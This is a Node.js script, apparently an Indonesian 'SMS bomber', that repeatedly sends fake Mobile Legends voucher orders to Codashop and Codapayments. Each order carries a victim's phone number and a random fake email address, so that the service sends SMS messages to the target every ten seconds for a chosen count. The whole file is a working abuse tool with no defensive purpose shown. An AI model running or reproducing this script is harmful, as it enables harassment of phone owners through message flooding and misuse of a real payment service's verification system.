const fetch = require('node-fetch');
const figlet = require('figlet');
const exec = require('shell_exec').shell_exec;

var cek = process.argv[2];
var target = process.argv[3];
var jumlah = process.argv[4];



if(cek != '--target'){
	console.log(cek + " unknown");
	}else{
		var subtarget = target.substring(0, 4);
		if(subtarget == "0877" || subtarget == "0819"){
			var price = "1465";
		}else if(subtarget == "0821" || subtarget == "0812" || subtarget == "0852"){
			var price = "1466";
		}else if(subtarget == "0857" || subtarget == "0858" || subtarget == "0856"){
			var price = "1464";
		}else{
			var price = "1467";
		}

		var intro = exec('php intro.php');
		var rand = exec('php rand.php');
			
		console.log(intro);
		console.log("Target : " + target);
		console.log("Jumlah : " + jumlah + "\n\n");
		
		for(var i=0; i < jumlah; i++){
			
			 setTimeout(function(){
				fetch("https://order.codashop.com/initPayment.action", {
					method: 'POST',
					headers: {
						'Referer' : 'https://www.codashop.com/id/mobile-legends',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
						'Content-Type': 'application/x-www-form-urlencoded'
					},
					body: "voucherPricePoint.id=" + price + "&voucherPricePoint.price=60000&voucherPricePoint.variablePrice=0&email=" + rand + "@gmail.com&n=1/30/2020-70&userVariablePrice=0&order.data.profile=eyJuYW1lIjoiIiwiaWRfbm8iOiIifQ==&user.userId=102675872&user.zoneId=3115&voucherTypeName=MOBILE_LEGENDS&affiliateTrackingId="
					})
				.then(res => res.json())
				.then(respon => {
					var jsondata = JSON.stringify(respon);
					var getdata = JSON.parse(jsondata);
					var txnId = getdata['txnId'];
					var url = "https://airtime.codapayments.com/airtime/begin?host_url=https://www.codashop.com/id/mobile-legends&txn_id=" + txnId + "&client_type=1&client_time=1580342912867&_ga=2.181839527.1422365406.1580341933-1570622617.1580341933";
					
					fetch(url)
					.then(res => res.text())
					.then(text => {
						var url2 = "https://airtime.codapayments.com/airtime/checkout?host_url=https://www.codashop.com/id/mobile-legends&txn_id=" + txnId + "&client_type=1&client_time=1580342912867&_ga=2.181839527.1422365406.1580341933-1570622617.1580341933";
						fetch(url2, {
						headers: {'Referer': url}
						})
						.then(res => res.text())
						.then(text => {
							
							fetch("https://airtime.codapayments.com/airtime/msisdn", {
							method: 'POST',
							headers: {
								'Referer' : url2,
								'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
								'Content-Type': 'application/x-www-form-urlencoded'
							},
							body: "TxnId=" + txnId + "&MnoId=0&submit_order=0&input_phone_number=" + target
							})
							.then(res => res.text())
							.then(text => {
								var cekrespon = text.match(/Kami sudah mengirimi SMS/);
								
								 if(cekrespon){
										console.log("[+] Terkirim ke => " + target);
									}else{
										console.log("[-] Gagal ke => " + target);
										}
								}
							)
						
							}
						)
						
						}
					)
				
					}
				);
				
				 }, i * 10000);
			}
		
		}
